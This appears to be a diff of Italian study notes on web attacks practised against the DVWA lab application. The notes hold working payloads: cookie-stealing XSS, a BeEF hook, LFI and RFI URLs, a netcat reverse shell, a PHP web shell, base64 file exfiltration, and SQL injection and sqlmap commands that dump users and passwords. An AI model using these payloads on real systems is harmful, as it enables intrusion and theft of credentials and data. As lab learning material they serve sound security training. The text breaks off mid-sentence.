@@ -1,38 +1,71 @@
+VULNERABILITA'
+
+***Beef xss framework***
+	una volta avviato beef, sul terminale viene indicato uno script che deve essere inviato al server. STEP:
+		1. copia lo script <script src="http://127.0.0.1:3000/hook.js"></script>
+		2. incollalo nel campo
+		3. fino a quando la tab della vittima resta aperta, beef puo' intercettare ed inoltrare exploit
+
 ***XSS Reflected***
-  Ottengo nella stessa pagina il risultato dello script
-  Pippo<script>alert(1)</script>
+	Ottengo nella stessa pagina il risultato dello script che passo
+	Claudio<script>alert(1)</script>
 
-    LEVEL LOW:
-      <script>alert(document.cookie)</script>
+	LEVEL LOW:
+		<script>alert(document.cookie)</script>
 
-    LEVEL MEDIUM:
-      <ScRiPt>alert(document.cookie)</ScRiPt>
-      <IMG onerror="alert(document.cookie);" src=x />
+	LEVEL MEDIUM:
+		<ScRiPt>alert(document.cookie)</ScRiPt>
+		<IMG onerror="alert(document.cookie);" src=x />
 
 ***XSS Stored***
-Posso reindirizzare il risultato dello script su un db
-<script>alert(document.cookie);</script>
+	Salvo il messaggio che inserisco e la risposta verra' visualizzata da tutti gli utenti che visitano la pagina.
+	<script>alert(document.cookie);</script>
 
 ***XSS DOM***
+	DOM e' la risultante della pagina scritta dal programmatore
+	
+	LEVEL LOW:
+	vado a scrivere direttamente nella url lo script
+	http://192.168.236.135/DVWA/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
 
 
 ***LFI***
 ci consente di includere all'interno della pagina html qualsiasi file all'interno del file sistema
-http://192.168.236.129/DVWA/vulnerabilities/fi/?page=/etc/passwd
+	LEVEL LOW:
+		posso leggere il contenuto dei file di rete  -->  http://192.168.236.129/DVWA/vulnerabilities/fi/?page=/etc/passwd
+		mando in esecuzione un file esterno .php con una shell. Dando poi il comando "ls" leggo il contenuto della cartella.
+			http://192.168.236.135/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/hackable/uploads/mia_foto.php&cmd=ls
+			http://{URL della pagina }/{querystring}/{path del file malevolo}/comando malevolo
 
 LOG POISONING
 
 
 ***RFI***
-ci consente di includere all'interno della pagina html qualsiasi file presente su altri siti
-http://192.168.236.129/DVWA/vulnerabilities/fi/?page=http://miosito_evil/pagina.txt
+	ci consente di includere all'interno della pagina html qualsiasi file presente su altri siti. Bisogna sottomettere un file txt in quanto, se mettiamo una pagina php, manderemo fuori il nostro output.
+	http://192.168.236.129/DVWA/vulnerabilities/fi/?page=http://miosito_evil/pagina.txt
 
 ***RCE***
 localhost; nc -e /bin/bash mioIP PORTA//  127.0.0.1; nc -e /bin/bash 192.168.236.1 4000
 
 ***FILE UPLOAD***
 https://www.owasp.org/index.php/Unrestricted_File_Upload
-crei una pagina .php con il seguente codice  <?php  system("id"); ?>
+
+Provo a caricare un file con un estensione diversa da quella indicata, o creo un file che esegua comandi remoti
+	crei una pagina .php con il seguente codice per vedere <?php  system("id"); ?>
+
+	***LIVELLO LOW***
+
+		***creo un file che contenga un comando che mi esegua una shell 
+			<?php system($_GET["cmd"]);  ?>      --> la variabile $_GET assumera' il valore "cmd" e quindi potra' eseguire la  shell remota
+			nella url del browser gli mando il comando da assegnare alla GET (es. http://192.168.236.135/DVWA/hackable/uploads/mia_foto.php?cmd=ls)
+			
+		***scaricare un file pdf salvato in una cartella del file system
+				http://192.168.236.135/DVWA/hackable/uploads/mia_foto.php?cmd=cat /var/www/html/file.pdf | base64 -
+				--> copio l'output e me lo incollo dentor un file in locale
+				cat file.enc | base64 -d - > pdf_scaricato.pdf
+
+	***LIVELLO MEDIUM***
+		intercetto la chiamata che la pagina fa al server e cambio il content type, passandogli il parametro "image/jpeg", cosi' da fargli capire che e' un'immagine
 
 
 ***BRUTE FORCE***
@@ -53,3 +86,19 @@ SELECT * FROM users WHERE id=''
 	' union select user, password from users #    -> tento la select inserendo due campi casuali
 	' union select 1, load_file('/etc/passwd')#'   -> mi permette di vedere un file della macchina che ospita il db 
 
+SQL-Inj Blind***
+
+	' or 1= sleep (5)#   -> invio il comando sleep che dice al db di aspettare 5 secondi prima di darmi la risposta
+
+	SQLMAP
+		sqlmap --help
+		
+		sqlmap --url='http://192.168.1.24/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit' --cookie=' (cookie intero) ' -b
+		
+		sqlmap --url='http://192.168.1.24/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit' --cookie=' (cookie intero) ' -D dvwa -T users --dump  -> sqlmap --url=' gli passo la url ' --cookie=' gli passo il cookie ' -D (nome del db) -T (nome della tabella) --dump
+
+		sqlmap --url=' url dell'applicazione ' --cookie=' cookie ' --passwords (tira giu' le password del database)
+
+
+***CSRF - Cross Site Request Forgery ***
+l'applicazione lato server non analizza da dove viene la richiesta. a questo punto, tramite la 
